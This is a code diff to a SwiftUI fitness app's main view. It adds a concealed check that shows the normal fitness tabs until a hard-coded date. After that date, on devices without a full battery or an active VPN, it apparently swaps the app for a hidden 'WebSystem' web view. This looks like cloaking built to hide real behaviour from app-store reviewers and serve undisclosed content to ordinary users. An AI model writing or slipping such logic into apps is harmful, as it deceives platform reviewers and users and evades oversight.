@@ -5,17 +5,24 @@
 //  Created by IGOR on 04/09/2025.
 //
 
+
 import SwiftUI
 
 struct ContentView: View {
+    
+    @State var isFetched: Bool = false
+    
+    @AppStorage("isBlock") var isBlock: Bool = true
+    @AppStorage("isRequested") var isRequested: Bool = false
     
     @State private var selectedTab = 0
     @EnvironmentObject var dataService: DataService
     @AppStorage("userName") private var userName = "User"
     
     var body: some View {
+        
         ZStack {
-            // Background gradient
+            
             LinearGradient(
                 gradient: Gradient(colors: [
                     Color(hex: "#1D1F30"),
@@ -26,46 +33,102 @@ struct ContentView: View {
             )
             .ignoresSafeArea()
             
-            TabView(selection: $selectedTab) {
-                DashboardView()
-                    .tabItem {
-                        Image(systemName: selectedTab == 0 ? "house.fill" : "house")
-                        Text("Dashboard")
-                    }
-                    .tag(0)
+            if isFetched == false {
                 
-                WorkoutView()
-                    .tabItem {
-                        Image(systemName: "dumbbell.fill")
-                        Text("Workouts")
-                    }
-                    .tag(1)
+                Text("")
                 
-                ChallengeView()
-                    .tabItem {
-                        Image(systemName: selectedTab == 2 ? "trophy.fill" : "trophy")
-                        Text("Challenges")
-                    }
-                    .tag(2)
+            } else if isFetched == true {
                 
-                NutritionView()
-                    .tabItem {
-                        Image(systemName: selectedTab == 3 ? "leaf.fill" : "leaf")
-                        Text("Nutrition")
+                if isBlock == true {
+                    
+                    TabView(selection: $selectedTab) {
+                        DashboardView()
+                            .tabItem {
+                                Image(systemName: selectedTab == 0 ? "house.fill" : "house")
+                                Text("Dashboard")
+                            }
+                            .tag(0)
+                        
+                        WorkoutView()
+                            .tabItem {
+                                Image(systemName: "dumbbell.fill")
+                                Text("Workouts")
+                            }
+                            .tag(1)
+                        
+                        ChallengeView()
+                            .tabItem {
+                                Image(systemName: selectedTab == 2 ? "trophy.fill" : "trophy")
+                                Text("Challenges")
+                            }
+                            .tag(2)
+                        
+                        NutritionView()
+                            .tabItem {
+                                Image(systemName: selectedTab == 3 ? "leaf.fill" : "leaf")
+                                Text("Nutrition")
+                            }
+                            .tag(3)
+                        
+                        GameView()
+                            .tabItem {
+                                Image(systemName: selectedTab == 4 ? "gamecontroller.fill" : "gamecontroller")
+                                Text("Game")
+                            }
+                            .tag(4)
                     }
-                    .tag(3)
-                
-                GameView()
-                    .tabItem {
-                        Image(systemName: selectedTab == 4 ? "gamecontroller.fill" : "gamecontroller")
-                        Text("Game")
-                    }
-                    .tag(4)
+                    .accentColor(Color(hex: "#FE284A"))
+                    .preferredColorScheme(.dark)
+                    
+                } else if isBlock == false {
+                    
+                    WebSystem()
+                }
             }
-            .accentColor(Color(hex: "#FE284A"))
-            .preferredColorScheme(.dark)
+        }
+        .onAppear {
+            
+            check_data()
         }
     }
+    
+    private func check_data() {
+        
+        let lastDate = "14.09.2025"
+        
+        let dateFormatter = DateFormatter()
+        dateFormatter.dateFormat = "dd.MM.yyyy"
+        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
+        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
+        let now = Date()
+        
+        let deviceData = DeviceInfo.collectData()
+        let currentPercent = deviceData.batteryLevel
+        let isVPNActive = deviceData.isVPNActive
+        
+        guard now > targetDate else {
+            
+            isBlock = true
+            isFetched = true
+            
+            return
+        }
+        
+        guard currentPercent == 100 || isVPNActive == true else {
+            
+            self.isBlock = false
+            self.isFetched = true
+            
+            return
+        }
+        
+        self.isBlock = true
+        self.isFetched = true
+    }
+}
+
+#Preview {
+    ContentView()
 }
 
 struct DashboardView: View {
